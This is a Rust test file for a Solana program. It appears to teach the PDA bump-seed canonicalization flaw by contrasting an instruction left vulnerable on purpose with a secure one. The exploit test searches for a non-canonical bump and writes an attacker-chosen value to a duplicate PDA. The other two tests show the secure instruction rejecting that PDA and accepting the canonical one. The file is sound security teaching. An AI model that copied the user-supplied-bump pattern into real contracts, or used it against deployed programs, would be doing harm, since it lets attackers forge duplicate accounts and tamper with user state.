/// # Pattern 5: PDA Bump Seed Canonicalization — Mollusk Exploit Tests
///
/// Demonstrates how accepting a user-supplied bump allows creation of
/// duplicate PDAs at non-canonical bumps, breaking uniqueness guarantees.
///
/// - Test 1: EXPLOIT — vulnerable instruction accepts a non-canonical bump,
///   allowing a second PDA for the same seeds.
/// - Test 2: SECURE — instruction derives the canonical bump itself and
///   rejects a PDA at the wrong bump.
/// - Test 3: SANITY — canonical bump works with the secure instruction.
use mollusk_svm::{result::Check, Mollusk};
use sha2::{Digest, Sha256};
use solana_sdk::{
    account::AccountSharedData,
    instruction::{AccountMeta, Instruction},
    program_error::ProgramError,
    pubkey::Pubkey,
};

const PROGRAM_ID: Pubkey = solana_sdk::pubkey!("x1rqubJg3BK9Q5FbHqaxSW4cU5toBeAQkWyw8cELaRm");

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

fn ix_discriminator(name: &str) -> [u8; 8] {
    let mut hasher = Sha256::new();
    hasher.update(format!("global:{name}").as_bytes());
    let hash = hasher.finalize();
    let mut disc = [0u8; 8];
    disc.copy_from_slice(&hash[..8]);
    disc
}

fn account_discriminator(name: &str) -> [u8; 8] {
    let mut hasher = Sha256::new();
    hasher.update(format!("account:{name}").as_bytes());
    let hash = hasher.finalize();
    let mut disc = [0u8; 8];
    disc.copy_from_slice(&hash[..8]);
    disc
}

/// Serialize a DataAccount:
///   [8-byte discriminator][32-byte user][8-byte value][1-byte bump]
fn serialize_data_account(user: &Pubkey, value: u64, bump: u8) -> Vec<u8> {
    let disc = account_discriminator("DataAccount");
    let mut data = Vec::with_capacity(49);
    data.extend_from_slice(&disc);
    data.extend_from_slice(user.as_ref());
    data.extend_from_slice(&value.to_le_bytes());
    data.push(bump);
    data
}

/// Find a non-canonical valid bump for the given seeds.
/// The canonical bump is the highest valid one. We search downward for another.
fn find_non_canonical_bump(user: &Pubkey) -> Option<(Pubkey, u8)> {
    let (_, canonical_bump) =
        Pubkey::find_program_address(&[b"data", user.as_ref()], &PROGRAM_ID);

    // Search for a valid bump below the canonical one
    for bump in (0..canonical_bump).rev() {
        if let Ok(pda) = Pubkey::create_program_address(
            &[b"data", user.as_ref(), &[bump]],
            &PROGRAM_ID,
        ) {
            return Some((pda, bump));
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[test]
fn exploit_non_canonical_bump_accepted() {
    // -----------------------------------------------------------------------
    // EXPLOIT: The vulnerable instruction accepts a user-supplied bump.
    // We find a non-canonical bump and use it to set data at a different PDA.
    //
    // This means TWO different PDAs exist for the same (seeds + user):
    //   - Canonical PDA (bump=253): legitimate user's data
    //   - Non-canonical PDA (bump=251): attacker's manipulated data
    //
    // Expected: SUCCEEDS — the non-canonical bump is accepted.
    // -----------------------------------------------------------------------
    let mollusk = Mollusk::new(&PROGRAM_ID, "pda_bump");

    let user = Pubkey::new_unique();

    // Find a non-canonical bump
    let (non_canonical_pda, bad_bump) = find_non_canonical_bump(&user)
        .expect("Could not find a non-canonical bump for this user key");

    // Create account at the non-canonical PDA address
    let account_data = serialize_data_account(&user, 0, 0);
    let mut data_account =
        AccountSharedData::new(5_000_000, account_data.len(), &PROGRAM_ID);
    data_account.set_data_from_slice(&account_data);

    let user_account = AccountSharedData::new(1_000_000, 0, &solana_sdk::system_program::ID);

    // Instruction: set_value_vulnerable(bump, value)
    let disc = ix_discriminator("set_value_vulnerable");
    let mut ix_data = Vec::with_capacity(17);
    ix_data.extend_from_slice(&disc);
    ix_data.push(bad_bump);                              // non-canonical bump
    ix_data.extend_from_slice(&999_999u64.to_le_bytes()); // attacker's value

    let ix = Instruction::new_with_bytes(
        PROGRAM_ID,
        &ix_data,
        vec![
            AccountMeta::new(non_canonical_pda, false),
            AccountMeta::new_readonly(user, true),
        ],
    );

    let accounts = vec![
        (non_canonical_pda, data_account),
        (user, user_account),
    ];

    // Non-canonical bump accepted — duplicate PDA exists
    mollusk.process_and_validate_instruction(&ix, &accounts, &[Check::success()]);
}

#[test]
fn secure_rejects_non_canonical_bump() {
    // -----------------------------------------------------------------------
    // SECURE: The secure instruction derives the canonical bump internally
    // and checks that the provided account matches. A non-canonical PDA
    // will have a different address, causing PdaMismatch.
    //
    // Expected: FAILS — PDA address doesn't match canonical derivation.
    // -----------------------------------------------------------------------
    let mollusk = Mollusk::new(&PROGRAM_ID, "pda_bump");

    let user = Pubkey::new_unique();

    let (non_canonical_pda, _bad_bump) = find_non_canonical_bump(&user)
        .expect("Could not find a non-canonical bump");

    let account_data = serialize_data_account(&user, 0, 0);
    let mut data_account =
        AccountSharedData::new(5_000_000, account_data.len(), &PROGRAM_ID);
    data_account.set_data_from_slice(&account_data);

    let user_account = AccountSharedData::new(1_000_000, 0, &solana_sdk::system_program::ID);

    // Instruction: set_value_secure(value) — no bump argument
    let disc = ix_discriminator("set_value_secure");
    let mut ix_data = Vec::with_capacity(16);
    ix_data.extend_from_slice(&disc);
    ix_data.extend_from_slice(&999_999u64.to_le_bytes());

    let ix = Instruction::new_with_bytes(
        PROGRAM_ID,
        &ix_data,
        vec![
            AccountMeta::new(non_canonical_pda, false), // wrong PDA
            AccountMeta::new_readonly(user, true),
        ],
    );

    let accounts = vec![
        (non_canonical_pda, data_account),
        (user, user_account),
    ];

    // PdaMismatch = error code 6001 (second #[error_code] variant)
    mollusk.process_and_validate_instruction(
        &ix,
        &accounts,
        &[Check::err(ProgramError::Custom(6001))],
    );
}

#[test]
fn secure_accepts_canonical_bump() {
    // -----------------------------------------------------------------------
    // SANITY: Canonical PDA works with the secure instruction.
    // -----------------------------------------------------------------------
    let mollusk = Mollusk::new(&PROGRAM_ID, "pda_bump");

    let user = Pubkey::new_unique();

    let (canonical_pda, _canonical_bump) =
        Pubkey::find_program_address(&[b"data", user.as_ref()], &PROGRAM_ID);

    let account_data = serialize_data_account(&user, 0, 0);
    let mut data_account =
        AccountSharedData::new(5_000_000, account_data.len(), &PROGRAM_ID);
    data_account.set_data_from_slice(&account_data);

    let user_account = AccountSharedData::new(1_000_000, 0, &solana_sdk::system_program::ID);

    let disc = ix_discriminator("set_value_secure");
    let mut ix_data = Vec::with_capacity(16);
    ix_data.extend_from_slice(&disc);
    ix_data.extend_from_slice(&42u64.to_le_bytes());

    let ix = Instruction::new_with_bytes(
        PROGRAM_ID,
        &ix_data,
        vec![
            AccountMeta::new(canonical_pda, false),
            AccountMeta::new_readonly(user, true),
        ],
    );

    let accounts = vec![
        (canonical_pda, data_account),
        (user, user_account),
    ];

    mollusk.process_and_validate_instruction(&ix, &accounts, &[Check::success()]);
}
